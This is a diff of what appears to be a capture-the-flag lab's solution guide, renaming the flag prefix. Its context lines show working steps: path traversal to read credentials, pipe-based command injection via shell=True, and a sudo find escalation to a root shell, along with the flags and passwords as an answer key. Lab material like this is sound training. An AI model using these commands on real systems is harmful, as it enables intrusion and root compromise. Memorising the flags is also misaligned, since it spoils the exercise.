@@ -24,9 +24,9 @@ Start all services: `docker-compose up --build`
 
 | Stage | Flag ID  | Value                                   | Location in container              |
 |-------|----------|-----------------------------------------|------------------------------------|
-| 1     | `stage1` | `FLAG{p4th_tr4v3rs4l_0pen_d00r}`        | `/data/secrets/credentials.txt` (web-traversal) |
-| 2     | `stage2` | `FLAG{c0mm4nd_1nj3ct10n_p1p3_dr34m}`   | `/home/ctf_user/flag2.txt` (shell-backend) |
-| 3     | `stage3` | `FLAG{gtf0_f1nd_r00t_4ccess_2026}`      | `/root/root_flag.txt` (shell-backend) |
+| 1     | `stage1` | `ASG{p4th_tr4v3rs4l_0pen_d00r}`        | `/data/secrets/credentials.txt` (web-traversal) |
+| 2     | `stage2` | `ASG{c0mm4nd_1nj3ct10n_p1p3_dr34m}`   | `/home/ctf_user/flag2.txt` (shell-backend) |
+| 3     | `stage3` | `ASG{gtf0_f1nd_r00t_4ccess_2026}`      | `/root/root_flag.txt` (shell-backend) |
 
 Flag values are defined in `flags.json` (project root) and injected at container startup.
 
@@ -59,7 +59,7 @@ curl "http://localhost:5000/api/files/read?name=../../../data/secrets/credential
 
 ```json
 {
-  "content": "Username: ctf_user\nPassword: r3str1ct3d_2026\nFlag: FLAG{p4th_tr4v3rs4l_0pen_d00r}",
+  "content": "Username: ctf_user\nPassword: r3str1ct3d_2026\nFlag: ASG{p4th_tr4v3rs4l_0pen_d00r}",
   "filename": "../../../data/secrets/credentials.txt"
 }
 ```
@@ -81,7 +81,7 @@ help | cat /home/ctf_user/flag2.txt
 **Expected output:**
 
 ```
-FLAG{c0mm4nd_1nj3ct10n_p1p3_dr34m}
+ASG{c0mm4nd_1nj3ct10n_p1p3_dr34m}
 ```
 
 Any allowlisted command followed by `| <arbitrary command>` works. The pipe is passed to `/bin/sh` because `shell=True`.
@@ -109,7 +109,7 @@ help | sudo find /root -name root_flag.txt -exec cat {} \;
 **Expected output:**
 
 ```
-FLAG{gtf0_f1nd_r00t_4ccess_2026}
+ASG{gtf0_f1nd_r00t_4ccess_2026}
 ```
 
 Alternatively, participants may spawn a root shell:
@@ -125,15 +125,15 @@ help | sudo find . -exec /bin/sh \; -quit
 1. Edit `flags.json` in the project root. Change the `"value"` field for the relevant stage:
 
    ```json
-   { "id": "stage1", "name": "Path Traversal", "value": "FLAG{your_custom_flag}" }
+   { "id": "stage1", "name": "Path Traversal", "value": "ASG{your_custom_flag}" }
    ```
 
 2. Update the matching environment variables in `docker-compose.yml` (shell-backend service):
 
    ```yaml
    environment:
-     - FLAG_STAGE2=FLAG{your_custom_flag2}
-     - FLAG_STAGE3=FLAG{your_custom_flag3}
+     - FLAG_STAGE2=ASG{your_custom_flag2}
+     - FLAG_STAGE3=ASG{your_custom_flag3}
    ```
 
    Stage 1's flag is written to `/data/secrets/credentials.txt` at build time by `services/web-traversal/create_secrets.sh` — update that script too if you change the Stage 1 flag value.
